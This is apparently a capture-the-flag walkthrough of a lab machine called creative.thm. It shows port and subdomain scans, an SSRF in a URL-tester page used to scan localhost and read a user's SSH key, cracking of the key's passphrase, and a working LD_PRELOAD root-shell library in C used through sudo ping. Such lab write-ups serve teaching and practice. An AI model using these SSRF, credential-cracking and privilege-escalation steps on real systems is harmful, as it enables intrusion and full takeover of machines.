nmap scan and  and feroxbuster:
```shell
nmap -A -T4 -p- 10.10.217.155
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 08:06 GMT
Nmap scan report for 10.10.217.155
Host is up (0.11s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 38:91:12:c7:ba:3c:78:f7:9a:7f:0c:10:1c:53:90:df (RSA)
|   256 41:da:26:12:cd:e2:6e:49:7f:be:6b:c4:6c:f5:60:52 (ECDSA)
|_  256 4d:e4:f8:4b:e0:94:b7:d1:d8:57:67:77:b0:6c:61:b0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (96%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 (96%), Linux 2.6.32 - 3.13 (90%), Linux 3.10 - 4.11 (90%), Linux 3.2 - 4.14 (90%), Linux 4.15 - 5.19 (90%), Linux 5.0 - 5.14 (90%), Linux 2.6.32 - 3.10 (90%), Linux 5.4 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   113.10 ms 10.11.0.1
2   113.13 ms 10.10.217.155

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.49 seconds


feroxbuster -u http://10.10.217.155 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip,tar,conf,inc -t 200 -s 200,204,301,302,403
                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.217.155
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, bak, zip, tar, conf, inc]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       12w      178c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
[####################] - 3m    270000/270000  0s      found:0       errors:1      
[####################] - 3m    270000/270000  1684/s  http://10.10.217.155
```
no endpoints, check website 
![[Pasted image 20251102153931.png]]
nothing can find too, no endpoints, no something
try to find subdomains:
```shell
ffuf -u 'http://creative.thm' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.creative.thm" -mc all -ac -t 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://creative.thm
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.creative.thm
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: all
________________________________________________

beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 162ms]
#www                    [Status: 400, Size: 166, Words: 6, Lines: 8, Duration: 115ms]
#mail                   [Status: 400, Size: 166, Words: 6, Lines: 8, Duration: 112ms]
:: Progress: [19966/19966] :: Job [1/1] :: 1736 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```
check subdomain `beta.creative.thm` 
![[Pasted image 20251102155018.png]]
url tester, lets check how it works
try to see what we have if use this website in url test ![[Pasted image 20251102155214.png]]
ok let's check `creative.thm` and in caido how it works
![[Pasted image 20251102155550.png]]
its just take HTMl from page, maybe SSRF, lets try `http://localhost` we take this page its mean what we can find something interesting, maybe on machine we have another point, use caido or burp or ffuf, i will try from ffuf
```shell
ffuf -u 'http://beta.creative.thm' -w <(seq 1 65535)  -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "url=http://127.0.0.1:FUZZ" -mc all -ac -t 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://beta.creative.thm
 :: Wordlist         : FUZZ: /proc/self/fd/11
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : url=http://127.0.0.1:FUZZ
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: all
________________________________________________

80                      [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 409ms]
1337                    [Status: 200, Size: 1143, Words: 40, Lines: 39, Duration: 350ms]
:: Progress: [65535/65535] :: Job [1/1] :: 539 req/sec :: Duration: [0:03:10] :: Errors: 600 ::
```
lets check a 1337 ![[Pasted image 20251102161024.png]]
okay, lets find something what we can use for shell, i checked a /root and we cantake this dir, lets see![[Pasted image 20251102161229.png]]
i find userflag:
![[Pasted image 20251102161254.png]]
now in `saad` dir i find ![[Pasted image 20251102161351.png]]
`.bash_history` and `ssh` i tried bash history first
![[Pasted image 20251102161439.png]]
we have password for `saad`
use ssh and take a first shell
```shell
ssh saad@10.10.239.109
The authenticity of host '10.10.239.109 (10.10.239.109)' can't be established.
ED25519 key fingerprint is SHA256:uwJynfJ8mhTqbwEA5iERPs1JNVjXSPZWd/gy1efH0LM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.239.109' (ED25519) to the list of known hosts.
saad@10.10.239.109: Permission denied (publickey).
```
we cant connect, try to take ssh key![[Pasted image 20251102161735.png]]
we can and use it in our file
use ssh now
```shell
ssh -i 123 saad@10.10.239.109
Enter passphrase for key '123': 
```
need passphrasw, try to use john to find it
```shell
ssh2john 123 > 1234
john 1234 --wordlist=rockyou.txt
...
123:sweetness
```
use it now again![[Pasted image 20251102162109.png]]
we take a shell, now we know a password check `sudo -l`
```shell
saad@ip-10-10-239-109:~$ sudo -l 
[sudo] password for saad: 
Matching Defaults entries for saad on ip-10-10-239-109:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User saad may run the following commands on ip-10-10-239-109:
    (root) /usr/bin/ping
```
we can start ping with `LD_PRELOAD` use this for our goal, make a lib on `C` and start with ping
code for rootme.c
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>  

__attribute__((constructor)) void root() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
after make from this a `.so` file
```shell
saad@ip-10-10-239-109:/tmp$ gcc -fPIC -shared -o rootme.so rootme.c
```
and start a 'ping'
```shell
sudo LD_PRELOAD=/tmp/rootme.so /usr/bin/ping
```
and we have a root
![[Pasted image 20251102170230.png]]
```shell
root@ip-10-10-239-109:/tmp# cat /root/root.txt
992bfd94b90da48634aed182aae7b99f
```
